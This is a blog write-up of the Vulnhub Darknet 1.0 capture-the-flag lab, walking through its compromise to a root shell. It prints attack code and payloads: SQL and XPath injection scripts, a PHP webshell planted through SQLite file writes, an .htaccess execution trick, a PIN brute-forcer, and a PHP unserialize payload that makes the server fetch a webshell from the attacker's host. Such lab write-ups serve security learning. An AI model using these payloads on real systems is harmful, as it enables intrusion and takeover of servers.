<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Vulnhub Darknet1.0 write up - Unlogic</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <link rel="canonical" href="http://unlogic.co.uk/2015/06/08/vulnhub-darknet1-dot-0-write-up/">

  
  

  
  

  
  

  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">

</head>
<body class="">

<div class="site-wrap">
  <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
      <nav class="site-nav right">
      <a href="http://unlogic.co.uk/tags">Tags</a>

</form>

      </nav>
      <div class="clearfix"></div>
    </div>
  </div>
</header>

  <div class="post p2 p-responsive wrap" role="main">
    <div class="measure">
      <div class="post-header mb2">
        <h1 class="py2">Vulnhub Darknet1.0 write up</h1>
        <span class="post-meta">Jun 8, 2015 by </span><br>
        
      </div>

      <article class="post-content">
      

<p><a href="https://www.vulnhub.com/entry/darknet-10,120/">Darknet 1.0</a> by <a href="https://www.vulnhub.com/author/q3rv0,111/">q3rv0</a>
isn&rsquo;t easy&hellip; for me anyway.</p>

<p>With some help and lots of reading I did however get to the bottom of it.</p>

<p>Here&rsquo;s my journey</p>

<h1 id="stage-1:3817275722f75303351ad52bb23d8c3d">Stage 1</h1>

<p>First things first: scan the target</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span> nmap -sV -p- 192.168.56.106

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST</span>
<span class="go">Nmap scan report for darknet.com (192.168.56.106)</span>
<span class="go">Host is up (0.00017s latency).</span>
<span class="go">Not shown: 65532 closed ports</span>
<span class="go">PORT      STATE SERVICE VERSION</span>
<span class="go">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span>
<span class="go">111/tcp   open  rpcbind 2-4 (RPC #100000)</span>
<span class="go">57664/tcp open  status  1 (RPC #100024)</span>
<span class="go">MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)</span>

<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 20.86 second</span>
</code></pre></div>


<p>Not much to be had here other than a web server. Poking at the RPC ports
didn&rsquo;t give any results. Browsing to the IP shows me:</p>


<figure >
    
        <img src="http://i.imgur.com/b513tfj.png" />
    
    
</figure>


<p>There&rsquo;s no <code>robots.txt</code> so nothing left to do but run <code>dirbuster</code> on it. Using the
<code>directory-list-2.3-medium.txt</code> I&rsquo;m rewarded with some directories and files that
might be of interest</p>


<figure >
    
        <img src="http://i.imgur.com/dNQnSQy.png" />
    
    
</figure>


<p>I downloaded the <code>888.darknet.com.backup</code> file and took a look at it.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">&lt;VirtualHost *:80&gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&lt;/VirtualHost&gt;
</code></pre></div>


<p>Hrmm.. a virtual host configuration. I added <code>192.168.56.106 888.darknet.com</code> to my local <code>/etc/hosts</code>
and then pointed my browser to <code>888.darknet.com</code> to be presented with this:</p>


<figure >
    
        <img src="http://i.imgur.com/PcMHBLd.png" />
    
    
</figure>


<p>Initial thoughts are SQLi, so  I started with some simple SQL injections to see
if my hunch is correct. Entering a username like <code>' or '1'='1</code>
yields an <em>Ilegal</em>[sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn&rsquo;t fancy working out
what chars I can and can&rsquo;t use so I made a script to do that for me</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">testit</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://888.darknet.com/index.php&#39;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;username=</span><span class="si">%s</span><span class="s">&amp;password=</span><span class="si">%s</span><span class="s">&amp;Action=Login&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&#39;.*Ilegal.*&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="se">\t</span><span class="s">Illegal&#39;</span> <span class="o">%</span> <span class="n">c</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="se">\t</span><span class="s"> OK&#39;</span> <span class="o">%</span> <span class="n">c</span>

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
    <span class="n">testit</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</code></pre></div>


<p>which yielded the following as illegal characters.</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">,	Illegal
-	Illegal
;	Illegal
&lt;	Illegal
=	Illegal
&gt;	Illegal
</code></pre></div>


<p>everything else was fair game. Well almost everything, some SQL commands aren&rsquo;t
allowed either. But I&rsquo;ve got enough to work with.
I have a good idea that <code>devnull</code> is a valid user, so I&rsquo;ll try to use that
info. I enter <code>devnull'/*</code> as a username hoping I am creating a query like
<code>SELECT * FROM users WHERE username='devnull'/* AND password='xxxx';</code>. Hitting
the login button confirms my input is correct.</p>

<p>I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to <code>index.php</code>.  Noticed this in Burp as it
was redirection to <code>main.php</code> after the correct SQLi, but then
going back to <code>index.php</code>. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.</p>

<p>Ok, so now I get</p>

<h1 id="stage-2:3817275722f75303351ad52bb23d8c3d">Stage 2</h1>


<figure >
    
        <img src="http://i.imgur.com/joaBvqT.png" />
    
    
</figure>


<p>Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.</p>

<p>While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter <code>'</code> for the username with any pass:
<code>unrecognized token: &quot;3590cb8af0bbb9e78c343b52b93773c9&quot;</code>. This is the md5 of the password.
Using a number like <code>1</code> for the password with <code>'</code> as the username gives
this error <code>near &quot;c4ca4238a0b923820dcc509a6f75849b&quot;: syntax error</code>
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.</p>

<p>One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to.
I ran <code>dirbuster</code> again and now have a few directories to try</p>


<figure >
    
        <img src="http://i.imgur.com/zlFz06Y.png" />
    
    
</figure>


<p>In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this</p>

<div class="highlight"><pre><code class="language-text" data-lang="text">attach database &#39;/home/devnull/public_html/test.php&#39; as db;                
drop table if exists db.test;                                                    
create table db.test(payload text);                                              
insert into db.test(payload) values(&#39;&lt;?php phpinfo(); ?&gt;&#39;);
</code></pre></div>


<p>From the Apache config I downloaded at the start, I know that the webroot is <code>/home/devnull/public_html</code>,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the <code>img</code> directory. So I&rsquo;ve got a place to
create files, but the bad news is that <code>exec</code>, <code>eval</code>, and its ilk are disabled.
This means no simple php shell. Boooo.</p>

<p>Not to worry, I got this. I knocked up a quick PHP script to do some work for me</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">if ($_GET[&quot;cmd&quot;] == &quot;db&quot;) {                                                     </span>
<span class="x">    $dbhandler=new SQLite3(&quot;/home/devnull/database/888-darknet.db&quot;);            </span>
<span class="x">                                                                                </span>
<span class="x">    $query = $dbhandler-&gt;query(&quot;SELECT * FROM login&quot;);                          </span>
<span class="x">                                                                                </span>
<span class="x">    while($result=$query-&gt;fetchArray()){                                        </span>
<span class="x">        print_r($result);                                                       </span>
<span class="x">        print &quot;&lt;br/&gt;&quot;;                                                          </span>
<span class="x">    }                                                                           </span>
<span class="x">}                                                                               </span>
<span class="x">                                                                                </span>
<span class="x">if ($_GET[&quot;cmd&quot;] == &quot;ls&quot;) {                                                     </span>
<span class="x">    $path = $_GET[&quot;arg&quot;];                                                       </span>
<span class="x">    @chdir($path);                                                              </span>
<span class="x">    $dir = @dir($path);                                                         </span>
<span class="x">    while($d = $dir-&gt;read()) {                                                  </span>
<span class="x">        print $d.&quot;&lt;br/&gt;&quot;;                                                       </span>
<span class="x">    }                                                                           </span>
<span class="x">}                                                                               </span>
<span class="x">if ($_GET[&quot;cmd&quot;] == &quot;cat&quot;) {                                                    </span>
<span class="x">    $file = $_GET[&quot;arg&quot;];                                                       </span>
<span class="x">    $fh = fopen($file, &quot;r&quot;);                                                    </span>
<span class="x">    if ($fh) {                                                                  </span>
<span class="x">        while ($l = fgets($fh)) {                                               </span>
<span class="x">            print htmlspecialchars($l).&quot;&lt;br/&gt;&quot;;                                 </span>
<span class="x">        }                                                                       </span>
<span class="x">        fclose($fh);                                                            </span>
<span class="x">    } else { print &quot;Cannot open &quot;.$file.&quot;&lt;br/&gt;&quot;; }                              </span>
<span class="x">} </span>
</code></pre></div>


<p>I use this as the payload in the <code>INSERT</code> statement.</p>

<p>With the <code>cmd</code> parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the <code>includes</code> folder.</p>

<p>I scoped around the server a bit, looking in the usual interesting folders, seeing if there&rsquo;s
anything useful. Eventually I found something interesting in the Apache
config folder. There&rsquo;s another virtual host on this machine at <code>signal8.darknet.com</code>.</p>

<p>Before I go on, I best mention <a href="https://github.com/dotcppfile/DAws">DAws</a> which
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the <code>DAws.php</code> file. This
will drop a <code>php.ini</code> on the server that allows you to run commands, and also create
a reverse shell to your host. <strong>Much</strong> easier than what I did, but you learn new things
all the time. This will be the PHP script I&rsquo;ll be using going forward.</p>

<h1 id="stage-3:3817275722f75303351ad52bb23d8c3d">Stage 3</h1>

<p>Ok, so now I&rsquo;m looking at the list of Darknet staff. Clicking on the usernames will take
me to a php page showing me that user&rsquo;s email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory
called <code>xpanel</code> which prompts me for another username and password combo.
No SQLi here though I&rsquo;m afraid. I cannot bruteforce this either. Well I <em>could</em>
but I don&rsquo;t think I&rsquo;ll get a hit any time soon.</p>

<p>Fastforward and I&rsquo;m stuck. After chatting to <em>g0blin</em> I get a hint that the <code>contact.php</code> is
a key. I start attempting to inject stuff into the <code>id</code> field. Eventually I notice that I am
not looking at the same DB. The ids don&rsquo;t match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn&rsquo;t getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like <code>...user/id=1]</code> Adding <code>][1</code> at the end will
return the first and only result, and we should get the email as per normal.
Adding <code>[2</code> will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.</p>


<figure >
    
        <img src="http://i.imgur.com/7jRrIo0.png" />
    
    
</figure>


<p>Excellent, it worked. Now I need to figure out how to make use of this. XPath isn&rsquo;t
something I&rsquo;ve come across very often.</p>

<p>So I begin to experiment. First off I figured out if it&rsquo;s XPath V2 or XPath V1.
If entering <code>id=1 or count(//*)][1</code> doesn&rsquo;t work, but <code>id=1 lower-case('A')][1</code> does,
then it&rsquo;s XPath V2, otherwise it&rsquo;s XPath V1.</p>

<p>While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the <code>substring</code> function. I wrote another python
script to do the heavy lifting</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="n">path</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">&#39;http://signal8.darknet.com/contact.php&#39;</span>
<span class="n">payload_tpl</span> <span class="o">=</span> <span class="s">&quot;1 and substring(name(</span><span class="si">%s</span><span class="s">),</span><span class="si">%d</span><span class="s">,1)=&#39;</span><span class="si">%s</span><span class="s">&#39;][1&quot;</span>

<span class="n">name</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="n">cmp_pos</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">carry_on</span> <span class="o">=</span> <span class="bp">True</span>

<span class="k">while</span> <span class="n">carry_on</span><span class="p">:</span>

    <span class="n">carry_on</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="k">print</span> <span class="n">name</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;id&#39;</span><span class="p">:</span> <span class="n">payload_tpl</span> <span class="o">%</span> <span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="n">cmp_pos</span><span class="p">,</span><span class="n">c</span><span class="p">)}</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;errorlevel&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">name</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="n">carry_on</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">break</span>

    <span class="n">cmp_pos</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">print</span> <span class="s">&#39;Path name:&#39;</span><span class="p">,</span> <span class="n">name</span>
</code></pre></div>
</p>

<p>So I ran this with the current path</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~/darknet#</span> python xpath.py 
<span class="go">u</span>
<span class="go">us</span>
<span class="go">use</span>
<span class="go">user</span>
<span class="go">Path name: user</span>
</code></pre></div>
</p>

<p>and the parent path</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~/darknet#</span> python xpath.py ..
<span class="go">a</span>
<span class="go">au</span>
<span class="go">aut</span>
<span class="go">auth</span>
<span class="go">Path name: auth</span>
</code></pre></div>
</p>

<p>Ok, that will help me get some more data from the file. I try to see if the
email field will work with <code>1]/email|auth[id=1</code>. I need the <code>auth</code> part because
without it the query will not close correctly in the main script, and this
makes sure the closing <code>]</code> won&rsquo;t error.</p>

<p>So now I should be able to get the username with <code>1]/username|auth[id=1</code>.
Now let&rsquo;s try the password field. I tried <code>pass</code> and <code>password</code> before I realised we&rsquo;re dealing with another
language here. Thanks to the logins I know that the spanish for password is <em>clave</em>.
<code>id=1]/clave|auth[id=1</code> throws up the password! Result. Using these detail
I am able to login at <code>signal8.darknet.com/xpanel</code></p>

<h1 id="stage-4:3817275722f75303351ad52bb23d8c3d">Stage 4</h1>

<p>
<figure >
    
        <img src="http://i.imgur.com/TVG7WhQ.png" />
    
    
</figure>
</p>

<p>Oooh a PHP editor! Sweet&hellip; yeah right. Clicking the link goes to a page that shows:</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">Tr0ll Found

The requested URL /xpath/xpanel/edit.php was not found on this server.
</code></pre></div>
</p>

<p>So after some manual digging nothing comes up. Time to break out <code>dirbuster</code> again
to find <code>ploy.php</code> which presents me with</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/DueLt5z.png" />
    
    
</figure>
</p>

<p>It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I&rsquo;ll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.</p>

<p>Here&rsquo;s my bruteforce script:</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="n">user</span> <span class="o">=</span> <span class="s">&#39;devnull&#39;</span>
<span class="n">passwd</span> <span class="o">=</span> <span class="s">&#39;j4tC1P9aqmY&#39;</span>

<span class="n">base_url</span> <span class="o">=</span> <span class="s">&#39;http://signal8.darknet.com/xpanel/&#39;</span>

<span class="n">login_url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s">&#39;index.php&#39;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">}</span>

<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>

<span class="n">ploy_url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s">&#39;ploy.php&#39;</span>

<span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">([</span><span class="s">&quot;37&quot;</span><span class="p">,</span><span class="s">&quot;58&quot;</span><span class="p">,</span><span class="s">&quot;22&quot;</span><span class="p">,</span><span class="s">&quot;12&quot;</span><span class="p">,</span><span class="s">&quot;72&quot;</span><span class="p">,</span><span class="s">&quot;10&quot;</span><span class="p">,</span><span class="s">&quot;59&quot;</span><span class="p">,</span><span class="s">&quot;17&quot;</span><span class="p">,</span><span class="s">&quot;99&quot;</span><span class="p">],</span> <span class="mi">4</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;Action&#39;</span><span class="p">:</span><span class="s">&#39;Upload&#39;</span><span class="p">,</span>
               <span class="s">&#39;checkbox[]&#39;</span><span class="p">:</span> <span class="n">attempt</span>

              <span class="p">}</span>

    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;imag&#39;</span><span class="p">:(</span><span class="s">&#39;info.txt&#39;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;info.php&#39;</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">ploy_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;Key incorrecta!&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;Found pin: &#39;</span><span class="p">,</span> <span class="n">attempt</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>
</p>

<p>The correct PIN is <code>'37', '10', '59', '17'</code>. I tried to upload a PHP script, but
that won&rsquo;t work. Seems uploading anything with a <code>php</code> extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site <code>AllowOverride All</code> is on. Most likely going to be something to
do with <code>.htaccess</code>. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">Order deny,allow
Allow from all
ErrorDocument 404 https://google.com
</code></pre></div>
</p>

<p>This should direct me to <code>google.com</code>, which it does, indicating <code>.htaccess</code> overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?</p>

<p>Unfortunately there&rsquo;s another issue: as I upload files, old files seem to get deleted.
I found this out when the 404 redirect stopped working after uploading an html file.</p>

<p>Luckily I discovered that it&rsquo;s possible to execute php code inside the .htaccess file.</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">AddHandler application/x-httpd-php .htaccess                                    
DirectoryIndex .htaccess                                                        
&lt;FilesMatch &quot;^\.htaccess&quot;&gt;                                                      
Order deny,allow                                                                
Allow from all                                                                  
SetHandler application/x-httpd-php                                              
&lt;/FilesMatch&gt;                                                                   
                                                                                
#&lt;?php print $_GET[&quot;test&quot;]; ?&gt; 
</code></pre></div>
</p>

<p>Sure enough the <code>$_GET[&quot;test&quot;]</code> variable is on the page. So this should allow me
to get a run some useful code on there somehow.</p>

<p>After following some blind leads, I wrote a php script that would take a file encoded
with base64 and a filename via a <code>POST</code> method and write this file out.
(Note: appending the entire script for DAws or similar didn&rsquo;t work).
Something like this should work though:</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">$fp = fopen($_POST[&#39;name&#39;], &#39;wb&#39;); </span>
<span class="x">fwrite($fp, base64_decode($_POST[&#39;data&#39;])); </span>
<span class="x">fclose($fp);</span>
</code></pre></div>
</p>

<p>At the end of the <code>.htaccess</code> file. However this always error with a permissions
error.</p>

<p>After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It&rsquo;s <code>suphp</code> not <code>php</code>,
so I wasn&rsquo;t executing the script as the <code>errorlevel</code> user. Derp.</p>

<p>More info on <a href="http://suphp.org/Home.html">suphp</a></p>

<h1 id="stage-5:3817275722f75303351ad52bb23d8c3d">Stage 5</h1>

<p>So having sorted that I uploaded <code>DAws</code> and got myself a reverse shell and explored
once more. Now inside <code>/var/www</code> there&rsquo;s some files I missed earlier: <code>sec.php</code>,
<code>Classes/Test.php</code>, and <code>Classes/Show.php</code>. Interesting.</p>

<p>Trying to hit <code>darknet.com/sec.php</code> errors. Let&rsquo;s take a look inside of it</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>

<span class="k">require</span> <span class="s2">&quot;Classes/Test.php&quot;</span><span class="p">;</span>
<span class="k">require</span> <span class="s2">&quot;Classes/Show.php&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">])){</span>
    <span class="nv">$d</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
    <span class="nv">$j</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$j</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
</p>

<p>Rembering that we&rsquo;re dealing with suphp it could well be that the 500 error is
because <code>sec.php</code> is trying to run as <code>root</code>. Checking <code>/etc/suphp/suphp.conf</code>
my suspicion is correct, the <code>min_uid</code> and <code>min_gid</code> settings are too high for
<code>root</code> scripts to run. But hey, as luck would have it (thanks q3rv0) <code>suphp.conf</code>
is <code>777</code>. So heading straight to <code>sed</code></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> sed -i <span class="s1">&#39;s/min_uid=100/min_uid=0/g&#39;</span> suphp.conf
<span class="go">sed: couldn&#39;t open temporary file ./sedm2LUZQ: Permission denied</span>
</code></pre></div>
</p>

<p>Hmph. Ok then I&rsquo;ll copy the <code>suphp.conf</code> to <code>/tmp</code> and edit it there, then copy
it back. Making sure I change both <code>min_uid</code> and <code>min_gid</code>, I reload <code>sec.php</code> and
get a blank page. No errors are good errors.</p>

<p>Now that I&rsquo;ve got <code>sec.php</code> running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)</p>

<p><code>sec.php</code> unserialises our input, which basically takes a serialised string
and <a href="https://php.net/manual/en/function.unserialize.php">unserialises into an object</a>.
Similar to Python&rsquo;s pickle. There&rsquo;s no way I can call a method on either of the classes,
so I have to see what will get called for me.
The <code>Test</code> class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that&rsquo;s what
we&rsquo;re supposed to use.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$name_file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$path</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
        <span class="nv">$data</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">);</span>
        <span class="nv">$f</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">path</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name_file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
        <span class="nb">chmod</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">path</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name_file</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
</p>

<p>The <code>Show</code> class on the other hand is only useful for testing, as this will provide visual
feedback when <code>sec.php</code> gets rendered and runs the <code>echo</code> statement. This will
invoke the <code>__toString</code> method on the <code>Show</code> class. Passing <code>test=O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;s:2:&quot;XX&quot;;}</code>
will print <code>Showme</code>, confirming that the serialisation worked.</p>

<p>Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the <code>Test</code> class and
prints out the string I need. Which is</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:30:&quot;http://192.168.56.101/DAws.txt&quot;;s:9:&quot;name_file&quot;;s:8:&quot;DAws.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;}
</code></pre></div>
</p>

<p>Using Burp suite I use a <code>GET</code> request to <code>sec.php</code>, send it to <code>Repeater</code> and convert
it to a <code>POST</code> request with the required payload:</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/kiutbRt.png" />
    
    
</figure>
</p>

<p>Then I, once again, browse to my DAws url and bind a shell to finally get:</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span> whoami <span class="o">&amp;&amp;</span> id
<span class="go">root</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="gp">#</span> cat flag.txt
<span class="go">      ___           ___           ___           ___           ___           ___           ___     </span>
<span class="go">     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    </span>
<span class="go">    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   </span>
<span class="go">   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  </span>
<span class="go">  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ </span>
<span class="go"> /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\</span>
